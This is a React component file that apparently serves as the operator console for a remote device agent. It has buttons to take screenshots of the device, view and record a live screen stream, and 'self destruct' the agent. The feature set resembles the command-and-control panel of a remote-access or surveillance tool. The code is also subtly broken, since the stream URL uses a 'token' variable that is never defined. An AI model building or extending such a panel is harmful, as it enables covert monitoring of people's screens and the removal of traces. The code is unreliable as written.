import React, { useState, useEffect, useRef } from 'react';
import { apiFetch } from '../api/client.js';

function LiveModal({ deviceId, onClose }) {
  const [fps, setFps] = useState(0);
  const [frames, setFrames] = useState(0);
  const [saving, setSaving] = useState(false);
  const pollRef = useRef(null);
  useEffect(() => {
    pollRef.current = setInterval(async () => {
      try {
        const s = await apiFetch(`/api/stream/${deviceId}/status`);
        setFps(s.fps ?? 0);
        setFrames(s.frames ?? 0);
      } catch {}
    }, 1000);
    return () => clearInterval(pollRef.current);
  }, [deviceId]);

  async function stopAndSave() {
    setSaving(true);
    try {
      await apiFetch(`/api/devices/${deviceId}/commands`, {
        method: 'POST',
        body: JSON.stringify({ type: 'stop_screen_stream', payload: {} }),
      });
      await apiFetch(`/api/stream/${deviceId}/stop`);
      const resp = await fetch(`/api/stream/${deviceId}/video`, {
        credentials: 'include',
      });
      if (resp.ok) {
        const blob = await resp.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url; a.download = `live_${deviceId}.mp4`; a.click();
        URL.revokeObjectURL(url);
      }
    } catch (e) {
      alert(`Stop failed: ${e.message}`);
    } finally {
      setSaving(false);
      onClose();
    }
  }

  return (
    <div style={{
      position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.92)', zIndex: 9999,
      display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: 16,
    }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 16 }}>
        <span style={{ color: '#ff453a', fontSize: 11, fontWeight: 700, letterSpacing: '0.08em' }}>● LIVE</span>
        <span style={{ color: '#636366', fontSize: 11 }}>{fps} fps · {frames} frames</span>
        <button
          onClick={stopAndSave}
          disabled={saving}
          style={{
            padding: '6px 18px', borderRadius: 8, border: 'none', fontSize: 12, fontWeight: 600,
            background: saving ? '#2c2c2e' : '#ff453a', color: '#fff', cursor: 'pointer',
          }}
        >{saving ? 'Saving…' : '⏹ Stop & Save MP4'}</button>
        <button
          onClick={onClose}
          style={{ padding: '6px 12px', borderRadius: 8, border: 'none', fontSize: 12, background: '#2c2c2e', color: '#636366', cursor: 'pointer' }}
        >✕</button>
      </div>
      <img
        src={`/api/stream/${deviceId}/mjpeg?token=${token}`}
        alt="Live stream"
        style={{
          maxWidth: '90vw', maxHeight: '80vh', borderRadius: 12,
          border: '1px solid #2c2c2e', imageRendering: 'pixelated',
        }}
        onError={() => {}}
      />
      <span style={{ color: '#3a3a3c', fontSize: 11 }}>Waiting for first frame… (device captures at ~{fps || 8} fps)</span>
    </div>
  );
}

export default function CommandPanel({ deviceId, onSent, shotSentAt, shotDone, onShotSent }) {
  const [sending, setSending] = useState({});
  const [destructConfirm, setDestructConfirm] = useState(false);
  const [liveOpen, setLiveOpen] = useState(false);
  const [liveStarting, setLiveStarting] = useState(false);

  async function fireCommand(type, payload = {}) {
    setSending(s => ({ ...s, [type]: true }));
    try {
      await apiFetch(`/api/devices/${deviceId}/commands`, {
        method: 'POST',
        body: JSON.stringify({ type, payload }),
      });
      if (type === 'capture_screen') onShotSent?.();
      onSent?.();
    } catch (e) {
      alert(`Error: ${e.message}`);
    } finally {
      setSending(s => ({ ...s, [type]: false }));
    }
  }

  async function startLive() {
    setLiveStarting(true);
    try {
      await apiFetch(`/api/stream/${deviceId}/start`);
      await apiFetch(`/api/devices/${deviceId}/commands`, {
        method: 'POST',
        body: JSON.stringify({ type: 'start_screen_stream', payload: { fps: 8, quality: 0.6, scale: 0.35 } }),
      });
      setLiveOpen(true);
    } catch (e) {
      alert(`Live start failed: ${e.message}`);
    } finally {
      setLiveStarting(false);
    }
  }

  const shotWaiting = !!shotSentAt && !shotDone;
  const shotComplete = !!shotDone;

  return (
    <>
      {liveOpen && <LiveModal deviceId={deviceId} onClose={() => setLiveOpen(false)} />}
      <div style={{ background: '#1c1c1e', borderRadius: 12, padding: 20 }}>
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>

          {/* Screenshot */}
          <button
            onClick={() => fireCommand('capture_screen')}
            disabled={sending['capture_screen'] || shotWaiting}
            style={{
              padding: '7px 16px', borderRadius: 20, border: 'none', fontSize: 13, fontWeight: 600,
              cursor: (sending['capture_screen'] || shotWaiting) ? 'default' : 'pointer',
              background: shotComplete ? '#30d158' : shotWaiting ? '#ff9f0a' : sending['capture_screen'] ? '#2c2c2e' : '#0a84ff',
              color: '#fff', transition: 'background 0.3s ease',
              opacity: shotWaiting ? 0.85 : 1,
            }}
          >
            {shotComplete ? '✓ Captured' : shotWaiting ? '⏳ Waiting…' : sending['capture_screen'] ? 'Sending…' : '📸 Screenshot'}
          </button>

          {/* Self Destruct */}
          {destructConfirm ? (
            <div style={{ display: 'flex', alignItems: 'center', gap: 6, background: '#ff453a22', border: '1px solid #ff453a55', borderRadius: 20, padding: '4px 12px' }}>
              <span style={{ fontSize: 12, color: '#ff453a', fontWeight: 600 }}>Destroy agent?</span>
              <button
                onClick={() => { setDestructConfirm(false); fireCommand('self_destruct'); }}
                disabled={!!sending['self_destruct']}
                style={{ padding: '3px 12px', borderRadius: 14, border: 'none', fontSize: 12, fontWeight: 700, background: '#ff453a', color: '#fff', cursor: 'pointer' }}
              >{sending['self_destruct'] ? '…' : 'Yes'}</button>
              <button
                onClick={() => setDestructConfirm(false)}
                style={{ padding: '3px 10px', borderRadius: 14, border: 'none', fontSize: 12, background: '#2c2c2e', color: '#636366', cursor: 'pointer' }}
              >Cancel</button>
            </div>
          ) : (
            <button
              onClick={() => setDestructConfirm(true)}
              style={{ padding: '7px 16px', borderRadius: 20, border: 'none', fontSize: 13, fontWeight: 600, cursor: 'pointer', background: '#ff453a', color: '#fff' }}
            >💥 Self Destruct</button>
          )}

          {/* Live */}
          <button
            onClick={startLive}
            disabled={liveStarting || liveOpen}
            style={{
              padding: '7px 16px', borderRadius: 20, border: 'none', fontSize: 13, fontWeight: 600,
              background: liveOpen ? '#ff453a33' : '#ff453a',
              color: liveOpen ? '#ff453a' : '#fff',
              cursor: liveStarting || liveOpen ? 'default' : 'pointer',
            }}
          >{liveStarting ? 'Starting…' : liveOpen ? '● Live' : '📹 Live'}</button>

        </div>
      </div>
    </>
  );
}
